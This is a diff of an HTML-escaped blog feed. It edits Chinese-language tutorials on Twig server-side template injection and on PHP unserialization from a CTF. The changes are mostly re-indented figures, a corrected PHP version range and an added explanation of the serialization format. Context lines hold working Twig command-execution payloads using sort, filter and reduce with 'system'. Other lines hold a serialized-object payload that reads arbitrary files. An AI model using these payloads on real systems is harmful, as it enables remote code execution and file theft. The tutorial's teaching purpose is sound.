@@ -377,11 +377,11 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在Twig 2.x 以及 3.x 的版本中， &lt;code&gt;_self&lt;/code&gt; 的作用发生了变化，只能返回当前实例名的字符串，因此这个payload只能够再1.x版本使用 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;../../../Documents/OrgNotes/OrgImages/Server_Side_Template_Injection_%28SSTI%29_%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%ef%bc%9a%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/2022-07-01_17-27-09_screenshot.png&#34;
-         alt=&#34;Figure 1: Deprecated Features of Twig 1.x&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;&lt;a class=&#34;link&#34; href=&#34;https://twig.symfony.com/doc/1.x/deprecated.html#globals&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Deprecated Features of Twig 1.x&lt;/a&gt;&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 1: Deprecated Features of Twig 1.x&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;&lt;a class=&#34;link&#34; href=&#34;https://twig.symfony.com/doc/1.x/deprecated.html#globals&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        &gt;Deprecated Features of Twig 1.x&lt;/a&gt;&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;同时 &lt;code&gt;getFilter&lt;/code&gt; 方法中也不再包含危险的函数了： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;TwigFilter&lt;/span&gt;
@@ -533,10 +533,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-01_23-34-07_screenshot.png&#34;
-         alt=&#34;Figure 2: uasort 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;uasort 函数测试命令行执行&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 2: uasort 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;uasort 函数测试命令行执行&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;同样可以用来进行远程代码执行，payload如下： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}}&lt;/span&gt;
@@ -593,10 +593,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/ol&gt;
 &lt;p&gt;也就是说这里$arrow直接可以配合$array进行执行 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-01_23-29-52_screenshot.png&#34;
-         alt=&#34;Figure 3: array_filter 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;array_filter 函数测试命令行执行&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 3: array_filter 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;array_filter 函数测试命令行执行&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;因此也可以payload于之前类似 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}}&lt;/span&gt;
@@ -626,10 +626,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中的 &lt;code&gt;array_reduce&lt;/code&gt; 方法同样也也将 $arrow 作为回调函数直接执行，并将 $array 作为参数带入 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-01_23-40-14_screenshot.png&#34;
-         alt=&#34;Figure 4: array_reduce 函数测试命令行调用&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;array_reduce 函数测试命令行调用&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 4: array_reduce 函数测试命令行调用&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;array_reduce 函数测试命令行调用&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;那么payload同样也是类似的，不过这里要传入的参数需要包含至少两个，这样才符合两个操作值： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;reduce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}}&lt;/span&gt;
@@ -748,7 +748,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;p&gt;源码内我们标出了三个限制点： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;A, 对GET输入检查是否包含&amp;rsquo;users&amp;rsquo;字符串，我们可以通过修改序列化字符串中的s为S，这样就可以支持利用16进制编码来进行绕过， &lt;code&gt;s:4:&amp;quot;user&amp;quot;; -&amp;gt; S:4:&amp;quot;use\72&amp;quot;;&lt;/code&gt; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
-&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法适用于PHP 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法只适用于PHP5 &amp;lt; 5.6.25, PHP7 &amp;lt; 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;li&gt;C, 无法直接获取文件名，可以配合 &lt;code&gt;glob://&lt;/code&gt; 协议来测信道出 flag 的文件名字 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;因此我们构造 payload： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
@@ -772,7 +772,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 得到序列化结果:
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\\72&amp;#34;;R:2;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\72&amp;#34;;R:2;}
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 文件任意读 payload：
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// input=O:6:&amp;#34;MyFile&amp;#34;:2: {s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;us\65r&amp;#34;;R:2;}&amp;amp;user=/proc/self/mounts
@@ -912,8 +912,9 @@ O%3A4%3A%22Name%2 &lt;code&gt;3&lt;/code&gt; %3A2%3A%7Bs%3A14%3A%22%00Name%00use
         &lt;/figcaption&gt;
 &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;p&gt;参考：[[&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://segmentfault.com/a/1190000022534926&lt;/a&gt;][CTF-Web-[极客大挑战 2019]PHP &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;参考： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CTF-Web-[极客大挑战 2019]PHP&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -963,8 +964,72 @@ O%3A4%3A%22Name%2 &lt;code&gt;3&lt;/code&gt; %3A2%3A%7Bs%3A14%3A%22%00Name%00use
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
+&lt;p&gt;接下来我们根据一篇古老文章来具体了解一下对象中的属性的序列化格式：&lt;a class=&#34;link&#34; href=&#34;https://www.neatstudio.com/show-161-1.shtml&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PHP 序列化（serialize）格式详解&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;a - array &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;b - boolean &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;d - double &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;i - integer &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;o - common object &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;r - reference &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;s - non-escaped binary string &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;S - escaped binary string &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;C - custom object &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;O - class &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;N - null &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;R - pointer reference &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;U - unicode string &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;null的序列化&#34;&gt;NULL的序列化&lt;/h4&gt;
+&lt;p&gt;N; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;h4 id=&#34;boolean&#34;&gt;boolean&lt;/h4&gt;
+&lt;p&gt;b:&amp;lt;digit&amp;gt;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;digit&amp;gt; = [&amp;lsquo;0&amp;rsquo;, &amp;lsquo;1&amp;rsquo;], 当boolean型数据为false时，序列化后的成员值为0 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;h4 id=&#34;integer&#34;&gt;integer&lt;/h4&gt;
+&lt;p&gt;i:&amp;lt;number&amp;gt;; &lt;!-- raw HTML omitted --&gt;
+&amp;lt;number&amp;gt;的取值范围为：-2147483648 到 2147483647，允许有符号，如果超过范围，就会被序列化为浮点数而不是整型，并且反序列化后也无法得到原来的数值 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;h4 id=&#34;double&#34;&gt;double&lt;/h4&gt;
+&lt;p&gt;d:&amp;lt;number&amp;gt;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;number&amp;gt;为浮点数，其范围为PHP中浮点数的范围一样大,并且可以表示为整型、浮点数型以及科学计数法 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;如果值为正/负无穷大，那么会被会被表示为INF/-INF，如果超过能表示的最小精度或者非数（NAN）的情况，就会返回0 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;h4 id=&#34;string&#34;&gt;string&lt;/h4&gt;
+&lt;p&gt;s:&amp;lt;length&amp;gt;:&amp;quot;&amp;lt;value&amp;gt;&amp;quot;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;S:&amp;lt;length&amp;gt;:&amp;quot;&amp;lt;value&amp;gt;&amp;quot;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;lt;length&amp;gt;是&amp;lt;value&amp;gt;的长度，是非负整数，允许带有正号（+） &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;&amp;lt;value&amp;gt;表示字符串值，其范围与 ASCII 相对应，没有转义字符 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;s表示普通的使用方法 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;S表示可以在字符串值中加入ASCII转义编码（从而进行绕过），编码的方式为 &lt;!-- raw HTML omitted --&gt;
+&lt;ul&gt;
+&lt;li&gt;对于ASCII码小于128的字符（不包括 &amp;lsquo;\&amp;rsquo;）,按照单个字节直接写入 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;对于ASCII码在128~255的字符和 &amp;lsquo;\&amp;rsquo; 字符，需要将其ASCII码值转化为16进制编码的字符串，以&amp;rsquo;\&amp;lsquo;作为开头，后两个字节分别为这个字符的16进制编码 &lt;!-- raw HTML omitted --&gt;
+&lt;ul&gt;
+&lt;li&gt;这样的方法同样适用于所有的ASCII字符，例如 r就可以转换为\72，都可以在&amp;rsquo;S&amp;rsquo; 下被解析成功 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;array&#34;&gt;array&lt;/h4&gt;
+&lt;p&gt;a:&amp;lt;n&amp;gt;:{&amp;lt;key_1&amp;gt;&amp;lt;value_1&amp;gt;&amp;lt;key_2&amp;gt;&amp;lt;value_2&amp;gt;&amp;hellip;&amp;lt;key_n&amp;gt;&amp;lt;value_n&amp;gt;} &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;lt;n&amp;gt;表示数组元素的个数 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;&amp;lt;key_1&amp;gt;就表示数组下标 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;&amp;lt;value_1&amp;gt;就表示对应的数组元素的值 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;lt;key_1&amp;gt;下标的类型只能是整型或者字符串类型 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;h4 id=&#34;对象的序列化&#34;&gt;对象的序列化&lt;/h4&gt;
+&lt;p&gt;O:&amp;lt;length&amp;gt;:&amp;quot;&amp;lt;class_name&amp;gt;&amp;quot;:&amp;lt;n&amp;gt;:{&amp;lt;field_name_1&amp;gt;&amp;lt;field_value_1&amp;gt;&amp;lt;field_name_2&amp;gt;&amp;lt;field_value_2&amp;gt;&amp;hellip;&amp;lt;field_name_n&amp;gt;&amp;lt;field_value_n&amp;gt;} &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;lt;length&amp;gt;表示对象的类名&amp;lt;class_name&amp;gt;的字符串长度 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;&amp;lt;n&amp;gt;表示对象中的属性个数，这里不包括 &lt;code&gt;static&lt;/code&gt; &amp;amp; &lt;code&gt;const&lt;/code&gt; 声明的静态属性，也就是说只有对象特有的属性才会被序列化 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;&amp;lt;filed_name&amp;gt;表示每个属性的名字，用之前提到过的字符串类型进行表示，例如：s:1:&amp;ldquo;a&amp;rdquo;; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;以及对应的&amp;lt;filed_value&amp;gt;值，可以是任何类型的，s:1:&amp;ldquo;a&amp;rdquo;;N;比如是一个NULL &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;访问控制修饰符&#34;&gt;访问控制修饰符&lt;/h4&gt;
 &lt;p&gt;我们可以观察到后面的变量名和变量值也是一一对应的，但是变量名的表示根据 &lt;code&gt;Access Modifiers, 访问控制修饰符&lt;/code&gt; 的不同而有不同的表示方法 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;公有&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;公有&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;受保护&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;// %00*%00属性名
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;私有的&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;// %00类名%00属性名
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;protected属性被序列化的时候属性值会变成 &lt;code&gt;%00*%00属性名&lt;/code&gt; &lt;!-- raw HTML omitted --&gt;
@@ -973,7 +1038,85 @@ private属性被序列化的时候属性值会变成 &lt;code&gt;%00类名%00属
 &lt;p&gt;就如同我们这里的结果： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s:4:&amp;#34;*b&amp;#34;; = s:4:&amp;#34;%00*%00b&amp;#34;;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s:7:&amp;#34;Testc&amp;#34;; = s:7:&amp;#34;%00Test%00c&amp;#34;;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;unserialize-反序列化&#34;&gt;Unserialize 反序列化&lt;/h3&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;对象引用和指针引用-r-r&#34;&gt;对象引用和指针引用 R:r&lt;/h4&gt;
+&lt;p&gt;我们根据一个例子来看看两种引用的区别 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;SampleClass&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
